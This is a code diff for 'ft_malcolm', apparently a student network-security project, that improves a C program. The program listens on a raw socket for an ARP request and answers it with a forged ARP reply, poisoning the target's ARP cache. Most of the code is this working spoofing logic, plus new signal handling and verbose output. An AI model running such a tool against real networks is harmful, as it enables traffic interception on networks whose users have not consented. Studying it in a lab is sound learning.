@@ -12,6 +12,16 @@
 
 #include "ft_malcolm.h"
 
+int packet_socket = -1;
+
+void sig_int (int sig_num)
+{
+	printf("\nProgram was interrupted, closing socket...\n");
+	if (packet_socket != -1)
+		close(packet_socket);
+	exit(sig_num);
+}
+
 void my_mac (unsigned char *addr, int ifindex)
 {
 	struct ifaddrs *ifaddr;
@@ -26,10 +36,13 @@ void my_mac (unsigned char *addr, int ifindex)
 	freeifaddrs(ifaddr);
 }
 
-void edit_packet (struct ethhdr *eth, struct ether_arp *arp, char **av, int ifindex)
+void edit_packet (struct ethhdr *eth, struct ether_arp *arp, char **av, int ifindex, int verbose)
 {
-	// printf("ARP Request :\n");
-	// print_arp(eth, arp);
+	if (verbose)
+	{
+		printf("%sARP request :%s\n", CYAN, RESET);
+		print_arp(eth, arp);
+	}
 
 	my_mac(eth->h_source, ifindex);
 	fill_mac(eth->h_dest, av[4]);
@@ -40,16 +53,20 @@ void edit_packet (struct ethhdr *eth, struct ether_arp *arp, char **av, int ifin
 	*(unsigned int *)arp->arp_tpa = inet_addr(av[3]);
 	fill_mac(arp->arp_tha, av[4]);
 
-	// printf("Modified buffer (ARP Reply) :\n");
-	// print_arp(eth, arp);
+	if (verbose)
+	{
+		printf("%sGenerated ARP reply :%s\n", CYAN, RESET);
+		print_arp(eth, arp);
+	}
 }
 
 int main (int ac, char **av)
 {
+	signal(SIGINT, sig_int);
+
 	if (error_check(ac, av))
 		return (1);
 
-	int packet_socket;
 	char packet[1000] = {0};
 	struct sockaddr_ll addr = {0};
 	socklen_t addrlen = sizeof(addr);
@@ -57,6 +74,13 @@ int main (int ac, char **av)
 	struct ether_arp *arp;
 
 	packet_socket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+	if (packet_socket == -1)
+	{
+		printf("ft_malcolm: error opening socket\n");
+		return (1);
+	}
+
+	printf("Waiting for an ARP request...\n\n");
 
 	while (1)
 	{
@@ -70,13 +94,14 @@ int main (int ac, char **av)
 			break ;
 	}
 
-	printf("Received ARP Request from target !\n\n");
+	printf("Received ARP request !\n");
+	printf("%s%s asks : Who is %s ?\n\n%s", RED, av[3], av[1], RESET);
 
-	edit_packet(eth, arp, av, addr.sll_ifindex);
+	edit_packet(eth, arp, av, addr.sll_ifindex, av[5] != NULL);
 
 	sendto(packet_socket, packet, ETHER_HDR_LEN + ETHER_ARP_LEN, 0, (struct sockaddr *)&addr, sizeof(struct sockaddr_ll));
 
-	printf("Sent spoofed ARP Reply, check ARP table on target !\n\n");
+	printf("Sent spoofed ARP reply, check ARP table on target !\n");
 
 	close(packet_socket);
 
